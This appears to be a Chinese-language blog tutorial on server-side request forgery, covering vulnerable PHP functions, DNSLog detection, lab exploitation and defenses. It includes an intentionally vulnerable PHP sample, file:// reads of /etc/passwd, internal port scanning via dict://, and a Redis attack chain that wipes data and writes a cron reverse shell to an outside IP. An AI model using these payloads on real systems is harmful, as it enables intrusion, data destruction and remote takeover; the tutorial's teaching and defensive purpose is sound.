+<p>由客户端设备（个人计算机、电脑手机等）或软件（浏览器、APP）发出的请求，以获取指定的网页、图片、视频或其他资源。比如当用户在浏览器中输入url或点击链接时，浏览器会自动发起HTTP请求，请求服务器返回指定的资源</p>
+<ol start="2">
+<li>服务器端请求</li>
+</ol>
+<p>服务器上的应用程序或服务会提供一些功能接口，比如API接口，用于与其他服务进行数据交互。这些由服务器向其他的服务器发起的请求称之为服务器端请求。</p>
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>服务器端请求伪造（Server–side Request Forgery）简称SSRF，是指攻击者通过伪造服务器端请求，从而使服务器发起对第三方系统的攻击或访问。攻击者通常会使用受害者服务器上的应用程序作为代理来发起请求，以使请求看起来像是由服务器发起的。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726060693286-9d519217-4721-46f8-9896-b5a1905fec63.png"></p>
+<h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>由于服务端提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726060843061-0573f736-b1d7-44ab-a0c7-4391a6d099ef.png"></p>
+<h1 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h1><ol>
+<li>窃取数据：攻击者可以伪造请求以访问服务器内部网络或云环境中的其他服务或资源，以窃取敏感数据。</li>
+<li>攻击第三方系统：攻击者可以伪造请求以攻击第三方系统，例如访问其他组织的敏感数据或执行拒绝服务攻击DDOS。</li>
+<li>内部端口扫描：攻击者可以伪造请求以扫描服务器内部端口和服务，以寻找其他可能的漏洞。</li>
+<li>获取指纹信息：通过获取web应用可达服务器服务的指纹信息。</li>
+</ol>
+<blockquote>
+<p>请求内网敏感数据</p>
+</blockquote>
+<h1 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h1><p>SSRF漏洞一般存在于Web应用程序中，这些应用程序接受来自用户的输入，然后将其用于向其他服务器发出请求。攻击者可以在输入中注入恶意的URL，从而使服务器发起未经授权的请求，以访问敏感的内部资源。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件上传功能：Web应用程序通常允许用户上传文件，攻击者可以上传包含恶意URL的文件，以触发SSRF漏洞。</span><br><span class="line"></span><br><span class="line">图片处理功能：Web应用程序通常包含图片处理功能，攻击者可以在图片URL中注入恶意的URL，以触发SSRF漏洞。</span><br><span class="line"></span><br><span class="line">URL重定向功能：Web应用程序可能包含URL重定向功能，攻击者可以在重定向URL中注入恶意的URL，以触发SSRF漏洞。</span><br><span class="line"></span><br><span class="line">API调用：Web应用程序可能会使用API与其他服务进行交互，攻击者可以在API请求中注入恶意的URL，以触发SSRF漏洞。</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726127158863-f555fd21-e5b5-409b-86e5-207831f59de7.png">	</p>
+<h1 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h1><p>php：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这些函数用于发出HTTP请求，包括常见的函数如curl_exec() 、file_get_contents()、fsockopen()。如果这些函数允许从用户输入中获取URL，但未正确验证和过滤用户输入，攻击者可以通过在URL中注入恶意代码来触发SSRF漏洞。</span><br></pre></td></tr></table></figure>
+
+<p>java：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">仅支持 HTTP/HTTPS 协议的类：HttpClient 类、HttpURLConnection 类、 OkHttp 类、 Request 类</span><br><span class="line">支持 sun.net.www.protocol 所有协议的类：URLConnection 类、URL 类、ImageIO 类</span><br></pre></td></tr></table></figure>
+
+<h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h2><p>格式：curl_exec(resource $ch)</p>
+<p>作用：执行cURL会话</p>
+<p>新建php文件</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建一个cURL资源</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置URL和相应的选项</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;http://www.baidu.com/&quot;</span>);</span><br><span class="line"><span class="comment">// 设置不包括响应头信息，只返回正文内容</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 将SSL证书验证设置为false，即不验证对等证书</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 将SSL主机验证设置为FALSE，即不验证主机</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="literal">FALSE</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当我们访问这个网页时，会跳转到<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726127564878-6e44c836-1d7a-448e-9d37-fd19e511614a.png"></p>
+<h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>格式：file_get_contents(path,include_path,context,start,max_length)</p>
+<p>作用：把整个文件读入一个字符串中。将整个文件或一个url所指向的文件读入一个字符串中。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="variable">$filename</span>=<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span><span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$img</span>=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span><span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在该目录下创建一个images文件夹，用于接收生成的文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726128400332-03422f5c-2e73-43aa-ad3f-d13bb61153c3.png"></p>
+<p>自行传入url参数，之后在images文件夹下，可以看到生成的文件，文件内容与我们传入的参数相关</p>
+<h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.81.236&quot;</span>, <span class="number">9998</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: 192.168.81.236\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>更改ip信息</p>
+</blockquote>
+<p>开启本机http服务</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726129136925-7c7ddd46-52f2-4e98-824f-d2b6c4771ef5.png"></p>
+<p>访问php文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726129099618-8b7a06ef-6ec7-4c5a-8b0d-40d9bd403978.png"></p>
+<p>该电脑的文件目录能够显示出来</p>
+<h1 id="判断是否存在SSRF"><a href="#判断是否存在SSRF" class="headerlink" title="判断是否存在SSRF"></a>判断是否存在SSRF</h1><p>在无回显(Blid)的SSRF攻击中，攻击者无法直接获取目标系统返回的响应，因此需要寻找一种方法来间接地确认攻击是否成功。</p>
+<p>DNSLog：是一种常用的间接确认方法，它通过向一个域名提交请求，然后查看DNS服务器的日志来获取该域名的请求记录，从而确认攻击是否成功。</p>
+<p>攻击者可以在SSRF漏洞中注入带有DNSLog服务地址的URL,并将该URL发送到目标服务器上，当目标服务器对该URL进行请求时，DNSLog服务将接收到请求并记录在日志中。攻击者可以定期查看DNSLog的日志，以确认目标服务器是否对该URL进行了请求。</p>
+<blockquote>
+<p>无回显SSRF，使用DNSlog平台来测试有没有SSRF漏洞</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726131076236-f1d2d101-3b79-4e68-aea2-ae14d8407aeb.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726131067338-73869f23-278b-4bae-95d4-5f678acba696.png"></p>
+<p>dnslog平台有记录，说明存在ssrf漏洞</p>
+</blockquote>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>网络信息</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726131220019-d2677d0c-2eef-4134-b828-6260e44eeae3.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726131269365-c65be5d2-3d57-43c0-8226-7062cd7667d0.png"></p>
+<blockquote>
+<p>靶场有三个容器</p>
+</blockquote>
+<h2 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h2><p>file协议读取敏感文件</p>
+<p>格式：file:&#x2F;&#x2F;filepath（通常file后面&#x2F;&#x2F;&#x2F;是因为最后的&#x2F;表示根目录）</p>
+<blockquote>
+<p>读取的是目标服务器本地的文件，无法读取其他服务器的文件</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726132256528-3a59d7b0-8519-48ae-b6e9-891c13624665.png"></p>
+<blockquote>
+<p>访问的是ssrf-web这个容器的80端口</p>
+</blockquote>
+<p>&#x2F;etc&#x2F;passwd</p>
+<p>&#x2F;etc&#x2F;hosts</p>
+<p>hosts文件主要作用是定义IP地址和主机名的映射关系，是一个映射IP地址和主机名的规定。可以用文本文件打开！当用户在浏览器中输入一个网址时，系统会首先自动从hosts文件中寻找对应的IP地址，一旦找到，浏览器会立即打开对应网页，如果没有找到，则浏览器会将网址提交DNS服务器进行IP地址解析。简单来说就是负责地址与域名快速解析的文件，读取文件可以得到内网所在网段。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726133322928-ede363b2-613b-47b2-9f06-c32300dba210.png"></p>
+<h2 id="探测同c段其他主机"><a href="#探测同c段其他主机" class="headerlink" title="探测同c段其他主机"></a>探测同c段其他主机</h2><p>由于读取&#x2F;etc&#x2F;hosts文件可以得到所在的内网ip，我们可以对同C段其他主机进行爆破</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726196446593-a198f031-ce02-4780-a589-031ce3ef66f3.png"></p>
+<p>ip为172.20.0.4，我们对4进行爆破（0-255）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726196572716-8581c058-963a-4d6e-b5e5-443d3318c2f3.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726196678843-9f65a4a0-8d03-44cb-a003-4d6a3fbf24d2.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726196670491-9814bbec-c88b-42bd-a4ef-966ab62322f4.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726198084427-11f6181f-d3d9-430e-ad8d-c61d3840f4d4.png"></p>
+<p>看响应时间，时间短的即为可能存在的主机</p>
+<blockquote>
+<p>.1和.254一般不是主机，一般是网关	</p>
+<p>172.20.0.2</p>
+<p>172.20.0.3</p>
+<p>172.20.0.4</p>
+</blockquote>
+<h2 id="探测内网服务-dict"><a href="#探测内网服务-dict" class="headerlink" title="探测内网服务-dict"></a>探测内网服务-dict</h2><p>格式：dict:&#x2F;&#x2F;</p>
+<p>作用：dict是一个在线网络字典协议，用来架设一个字典服务。在SSRF中，常常用来探测内网的应用信息</p>
+<p>我们使用dict可以探测端口是否开放</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726201010041-59985f49-0425-4f74-bd6a-69eff4be4b65.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726201091803-5d72a3f1-2741-4eb5-9fe2-1b4f20d73ac8.png"></p>
+<blockquote>
+<p>探测.3的主机是否开放22端口：开放了； 6379端口：开放了</p>
+</blockquote>
+<p>172.20.0.2 - （本机</p>
+<p>172.20.0.3 - 22 6379 </p>
+<p>172.20.0.4 - 6379</p>
+<h2 id="通过dict-协议攻击内网Redis"><a href="#通过dict-协议攻击内网Redis" class="headerlink" title="通过dict:&#x2F;&#x2F;协议攻击内网Redis"></a>通过dict:&#x2F;&#x2F;协议攻击内网Redis</h2><p>Redis是一个key-value存储系统，是跨平台的非关系型数据库。（键值对）</p>
+<p>Redis一般绑定在本地的6379端口上，如果在没有开启认证的情况下，可以导致任意用户利用ssrf漏洞攻击内网中的未授权Redisl以及读取Redis的数据。</p>
+<p>攻击者在未授权访问Redis的情况下可以利用Redis的相关方法，如果运行redis的用户是root用户，攻击者可以通过写定时任务的方式进行反弹shell。</p>
+<p>测试redis是否存在未授权漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict://ip:port/info</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726202043161-3ed621e8-22c8-4a0e-9f02-62dec6a2ea28.png"></p>
+<blockquote>
+<p>存在</p>
+</blockquote>
+<p>存在redis未授权之后可以</p>
+<h3 id="写定时任务"><a href="#写定时任务" class="headerlink" title="写定时任务"></a>写定时任务</h3><p>定时任务是通过crond来完成，crond是一个linux下的定时执行工具。不同的系统定时任务保存的目录不同，centos的定时任务保存在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;目录下，ubuntu的定时任务保存在&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;.目录下.</p>
+<ol>
+<li>可以根据服务器是否存在以下文件判断服务器信息</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Centos</span><br><span class="line">/etc/redhat-release</span><br><span class="line"># Ubuntu</span><br><span class="line">/etc/lsb-release</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726202506232-e5799f87-e065-4cca-9e0a-fec28c478667.png"></p>
+<ol start="2">
+<li>在攻击主机（如果你的攻击目标是本地靶场，那攻击机可以使用kali;如果攻击目标是公网服务器，则接收反弹shell的机器也需要是公网服务器）监听一个端口，用以接收受害主机执行的定时任务所反弹回来的shell</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>在存在漏洞的网站依次执行</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 清空数据库（慎用）</span><br><span class="line">dict://127.0.0.1:6379/flushall</span><br><span class="line"># 设置工作目录</span><br><span class="line">dict://127.0.0.1:6379/config set dir /var/spool/cron/</span><br><span class="line"># 设置保存的文件名</span><br><span class="line">dict://127.0.0.1:6379/config set dbfilename root</span><br><span class="line"># 设置变量x，如果你是在本地虚拟机kali监听，则下方的ip也需要修改为kali</span><br><span class="line">dict://127.0.0.1:6379/set x &quot;\n*/2 * * * * bash -i &amp;&gt; /dev/tcp/122.114.225.41/1234 0&gt;&amp;1\n&quot;</span><br><span class="line"># 保存</span><br><span class="line">dict://127.0.0.1:6379/save</span><br><span class="line"></span><br><span class="line">//127.0.0.1改成6379端口开放的那个主机</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>攻击成功后攻击者监听的端口会接收到反弹回来的shell</li>
+</ol>
+<h3 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h3><p>SSH密钥对可以让您方便的登录到SSH服务器，而无需输入密码。SSH密钥对总是成双出现的，一把公钥，一把私钥。公钥可以自由的放在您所需要连接的SSH服务器上，而私钥必须的保管好。</p>
+<p>公钥登录，很多时候也说public key认证，公钥登录的原理：首先用户将自己的公钥存储在需要登录的远程机器上面，然后登录的时候，远程主机会向用户发送一段随机字符串，接着用户使用自己的私钥加密字符串，并发给远程主机。最后，远程主机使用存储的公钥进行解密，若解密成功，则说明用户可信，准许登录，不再提示输入密码。</p>
+<p>1、服务端会将客户端发的公钥写入到<del>&#x2F;.ssh&#x2F;authorized_keys文件末尾。（</del>为当前用户根目录）</p>
+<p>2、公钥和私钥在客户端（登录端）生成</p>
+<p>攻击流程：</p>
+<ol>
+<li>探测是否存在漏洞，比如说读取文件</li>
+</ol>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1726576114025-b2fa5217-d554-47fd-bb83-fda7a0b849db.png"></p>
+<ol>
+<li>探测端口，看22端口是否开放，6379端口是否开放</li>
+<li>测试redis是否存在未授权访问漏洞</li>
+<li>通过redis写ssh公钥，首先攻击方生成一对ssh key，默认情况下，生成后在用户的家目录下的.ssh目录下</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>服务器请求来源于业务本身的正常功能，比如图片的请求等，有的人动了坏心思，服务器端请求伪造漏洞。为了防御SSRF,目前主要有以下几个手段：</p>
+<ol>
+<li>白名单：设置用户提交的url白名单，比如，用户在访问<a target="_blank" rel="noopener" href="http://www.example.com时,提交的url只允许是来自example.com的/">www.example.com时，提交的url只允许是来自example.com的</a></li>
+<li>协议限制：限制只能使用http、https请求，可以避免如file:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;等情况带来的文件泄露；</li>
+<li>过滤返回信息：针对服务端返回的信息进行过滤，比如服务本身是去获取jpg格式的图片，那么返回其他的内容，就是不符合标准的，可以进行报错处理；</li>
+<li>统一错误信息：只显示固定几种错误信息，使SSRF事实上成为无回显类型。</li>
+</ol>
+<h1 id="SSRF无回显解决方案"><a href="#SSRF无回显解决方案" class="headerlink" title="SSRF无回显解决方案"></a>SSRF无回显解决方案</h1><p>跟RCE无回显道理是一样的，两种解决方法：</p>
+<p>反向连接（一般SSRF都是用这个反向连接方式，因为SSRF无法写文件）：让疑似存在RCE(SSRF)的目标请求外部一个网站，dnslog或者自己用vps python启用一个web服务，当dnslog或者自启用网站能接收到请求信息时，不就代表目标存在RCE(SSRF)) </p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586061980-4b6f5f4c-0681-4b30-bb4e-91fc814dd757.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586061788-d3d7b31a-2865-465b-9fb8-5ccce9da3c98.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1733586061792-41319436-370a-46a9-8afa-750fc727f77c.png"></p>
+<p>正向连接（一般RCE执行可以用这个方式， SSRF得用第一种方式）</p>
+<p>写个文件在对方网站目录下，然后再去访问网站目录是否存在这个文件就能判断目标是否执行了RCE命令</p>
+<p>让目标用nc起个监听，我们主动连过去。</p>
+<h1 id="SSRF漏洞挖掘思路"><a href="#SSRF漏洞挖掘思路" class="headerlink" title="SSRF漏洞挖掘思路"></a>SSRF漏洞挖掘思路</h1><p>黑盒探针：业务功能点</p>
+<ol>
+<li>社交分享功能：获取超链接的标题等内容进行显示</li>
+<li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li>
+<li>在线翻译：给网址翻译对应网页的内容</li>
+<li>图片加载&#x2F;下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li>
+<li>图片&#x2F;文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</li>
+<li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li>
+<li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li>
+<li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li>
+<li>邮件系统：比如接收邮件服务器地址</li>
+<li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li>
+<li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</li>
+</ol>
+<p>URL关键参数：</p>
+<ol>
+<li>share</li>
+<li>wap</li>
+<li>url</li>
+<li>link</li>
+<li>src</li>
+<li>source</li>
+<li>target</li>
+<li>u</li>
+<li>display</li>
+<li>sourceURl</li>
+<li>imageURL</li>
+<li>domain</li>
+</ol>
+<p>白盒分析：主要是看文件读取，加载，数据操作类的函数</p>
+<h1 id="SSRF协议利用"><a href="#SSRF协议利用" class="headerlink" title="SSRF协议利用"></a>SSRF协议利用</h1><p><font style="background-color:rgba(255, 255, 255, 0);">http:&#x2F;&#x2F;  Web常见访问，如<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">file:&#x2F;&#x2F;&#x2F; 从文件系统中获取文件内容，如，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">dict:&#x2F;&#x2F; 字典服务器协议，访问字典资源，如，dict:&#x2F;&#x2F;&#x2F;ip:6739&#x2F;info：</font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">sftp:&#x2F;&#x2F; SSH文件传输协议或安全文件传输协议</font></p>
+<p><font style="background-color:rgba(255, 255, 255, 0);">ldap:&#x2F;&#x2F; 轻量级目录访问协议</font></p>
